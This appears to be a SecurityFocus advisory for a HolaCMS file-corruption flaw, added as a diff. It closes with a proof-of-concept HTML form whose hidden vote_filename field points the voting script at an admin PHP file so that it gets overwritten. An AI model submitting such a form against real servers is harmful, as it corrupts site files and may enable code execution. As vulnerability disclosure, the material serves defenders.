@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/12789/info
+
+HolaCMS is prone to a vulnerability that may allow remote users to corrupt files on the server. This is due an input validation error that allows users to submit voting data to an attacker-specified file.
+
+It has been demonstrated that the issue may be exploited to compromise HolaCMS. Arbitrary system files may also be corrupted in the context of the Web server process. Though unconfirmed, it may be possible to execute arbitrary code by corrupting scripts on the computer. 
+
+<form action="http://www.example.com/[site-with-vote].php?vote=1" method="POST">
+<input type="hidden" name="vote_filename" value="admin/multiuser/multiuser.php">
+<input type="hidden" name="result" value="0">
+<input type="submit" value="Stimme abgeben" name="button">
+</form> 
